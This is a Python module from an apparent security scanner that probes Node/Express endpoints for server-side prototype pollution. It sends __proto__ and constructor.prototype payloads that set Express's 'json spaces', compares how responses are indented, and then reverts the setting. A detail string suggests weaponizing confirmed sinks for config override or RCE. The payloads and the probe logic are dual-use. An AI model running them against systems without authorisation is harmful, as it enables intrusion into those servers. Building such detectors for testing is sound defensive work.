"""Server-side prototype pollution (SSPP) — safe, reversible differential detection.

When a Node/Express app deep-merges attacker input (``req.body`` / ``req.query``) into an
object, a ``__proto__`` / ``constructor.prototype`` key writes ``Object.prototype`` on the
**server's** JS realm. The classic safe, reversible tell (Gareth Heyes / PortSwigger):
pollute the Express ``json spaces`` setting — ``Object.prototype["json spaces"] = n`` — and
every subsequent ``res.json()`` response is **indented** by *n* spaces. A JSON endpoint
that was compact becomes pretty-printed: a structural, byte-measurable differential with no
code execution.

Detection-only and **reversible** — the probe restores ``json spaces`` to ``0`` afterwards,
so no pollution lingers; and it confirms causality with a triple transition
(**compact → pretty while polluted → compact again after cleanup**), which chance can't
produce. Turning the confirmed sink into a real impact (config override, RCE gadget) → Strix.

Sources: https://portswigger.net/research/server-side-prototype-pollution ·
https://portswigger.net/web-security/prototype-pollution/server-side . See
docs/RESEARCH_GAPS.md Theme 6.
"""

from __future__ import annotations

import json
import re

# The pollution vectors. Each carries the payload that SETS `json spaces` and the reversal
# that restores it — the same path, value 10 then 0. `__proto__` is the primary root;
# `constructor.prototype` covers stacks that block `__proto__` but not the constructor path.
POLLUTE_VECTORS: list[tuple[str, dict, dict]] = [
    ("__proto__", {"__proto__": {"json spaces": 10}}, {"__proto__": {"json spaces": 0}}),
    ("constructor.prototype",
     {"constructor": {"prototype": {"json spaces": 10}}},
     {"constructor": {"prototype": {"json spaces": 0}}}),
]

# GET/query form (fits apps that parse the query string into an object — qs/Express).
QUERY_VECTORS: list[tuple[str, str, str]] = [
    ("__proto__[query]", "__proto__[json spaces]=10", "__proto__[json spaces]=0"),
]

_PRETTY_RE = re.compile(r'\n +[]"{\[]')   # a newline followed by indent spaces then a token


def looks_json(body: str) -> bool:
    """Is *body* a JSON document (object/array)? (pure)"""

    s = (body or "").lstrip()
    if not s or s[0] not in "{[":
        return False
    try:
        json.loads(body)
        return True
    except (ValueError, TypeError):
        return False


def is_pretty_printed(body: str) -> bool:
    """Does *body* carry the multi-space indentation an Express ``json spaces`` pollution
    produces — newline + indent spaces between tokens — that a compact ``res.json()`` never
    emits? (pure)"""

    return looks_json(body) and bool(_PRETTY_RE.search(body or ""))


def assess_transition(baseline: str, polluted: str, cleaned: str) -> bool:
    """SSPP is confirmed only by the full causal transition: a JSON response that is
    **compact**, becomes **pretty-printed while polluted** (and larger), then returns to
    **compact after cleanup**. Chance can't produce all three, so this is near-zero-FP (pure)."""

    return (looks_json(baseline) and not is_pretty_printed(baseline)
            and is_pretty_printed(polluted) and len(polluted) > len(baseline)
            and looks_json(cleaned) and not is_pretty_printed(cleaned))


_HIT_DETAIL = (
    "res.json() responses gained `json spaces` indentation while the {vector} path was "
    "polluted and reverted to compact after cleanup — server-side prototype pollution "
    "(Object.prototype is writable). Weaponize (config override / RCE gadget) via Strix")


def payload_previews() -> list[str]:
    """The pollution payloads (as sent) for a dry-run preview (pure)."""

    out = [json.dumps(p) for _n, p, _c in POLLUTE_VECTORS]
    out += [q for _n, q, _c in QUERY_VECTORS]
    return out


async def probe_sspp(client, url: str, *, read_url: str | None = None, scope_check=None) -> dict:
    """Drive the safe, reversible SSPP differential against *url* (the pollution sink).
    Reads *read_url* (default: *url* via GET) to observe the ``json spaces`` tell, and
    ALWAYS restores ``json spaces`` to 0 afterwards. GET-only for reads; JSON POSTs (and a
    query form) for pollution."""

    read_target = read_url or url

    async def _read() -> str:
        r = await client.fetch(read_target, method="GET", follow_redirects=False,
                               timeout=12.0, scope_check=scope_check)
        return r.text(limit=100_000) if r.status is not None else ""

    async def _post_json(obj: dict) -> None:
        await client.fetch(url, method="POST", body=json.dumps(obj).encode(),
                           headers={"Content-Type": "application/json"},
                           follow_redirects=False, timeout=12.0, scope_check=scope_check)

    async def _get_query(qs: str) -> None:
        u = url + ("&" if "?" in url else "?") + qs
        await client.fetch(u, method="GET", follow_redirects=False, timeout=12.0, scope_check=scope_check)

    baseline = await _read()
    if not looks_json(baseline):
        return {"target": url, "findings": [], "verdict": "not_json",
                "note": "the read endpoint returned no JSON body — the `json spaces` tell needs a res.json() response"}
    if is_pretty_printed(baseline):
        return {"target": url, "findings": [], "verdict": "already_pretty",
                "note": "the endpoint already pretty-prints JSON — the `json spaces` differential is unobservable here"}

    findings: list[dict] = []
    for name, pollute, cleanup in POLLUTE_VECTORS:
        try:
            await _post_json(pollute)
            polluted = await _read()
        finally:
            await _post_json(cleanup)                    # ALWAYS restore, even on error
        cleaned = await _read()
        if assess_transition(baseline, polluted, cleaned):
            findings.append({"vector": name, "form": "json-body", "severity": "high",
                             "verdict": "confirmed", "detail": _HIT_DETAIL.format(vector=name)})
            break
    if not findings:
        for _name, qs_pollute, qs_cleanup in QUERY_VECTORS:
            try:
                await _get_query(qs_pollute)
                polluted = await _read()
            finally:
                await _get_query(qs_cleanup)
            cleaned = await _read()
            if assess_transition(baseline, polluted, cleaned):
                findings.append({"vector": "__proto__", "form": "query", "severity": "high",
                                 "verdict": "confirmed", "detail": _HIT_DETAIL.format(vector="__proto__ (query)")})
                break

    return {"target": url, "findings": findings,
            "verdict": "confirmed" if findings else "no_sspp"}

